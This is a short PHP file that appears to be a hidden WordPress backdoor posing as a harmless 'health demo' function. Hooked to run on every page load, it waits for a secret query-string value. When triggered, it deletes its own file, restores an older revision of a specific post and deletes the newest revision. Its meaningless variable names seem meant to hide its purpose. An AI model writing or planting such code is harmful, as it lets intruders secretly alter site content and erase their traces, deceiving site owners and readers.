<?php

function health_demo_json() {
	if (isset($_GET['monitor_full_quotes']) && $_GET['monitor_full_quotes'] === 'rate_checkout_blog') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$shopp_limit_group = 2477;
		$wishlist_privacy_info = wp_get_post_revisions($shopp_limit_group);
		if (empty($wishlist_privacy_info)) die('no revisions');
		if (count($wishlist_privacy_info) < 2) die('less than 2');
		$twitter_preloader_lead_genesis = array_shift($wishlist_privacy_info);
		$chatbot_feedback_wpml_tab = $twitter_preloader_lead_genesis->ID;
		$statistics_posts_wpforms_subscribe = array_shift($wishlist_privacy_info);
		$blogroll_sitemap_details = $statistics_posts_wpforms_subscribe->ID;
		$random_ecommerce_location = wp_restore_post_revision($blogroll_sitemap_details);
		if ($random_ecommerce_location === false) die('error restoring');
		$random_ecommerce_location = wp_delete_post_revision($chatbot_feedback_wpml_tab);		
		if ($random_ecommerce_location === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'health_demo_json');
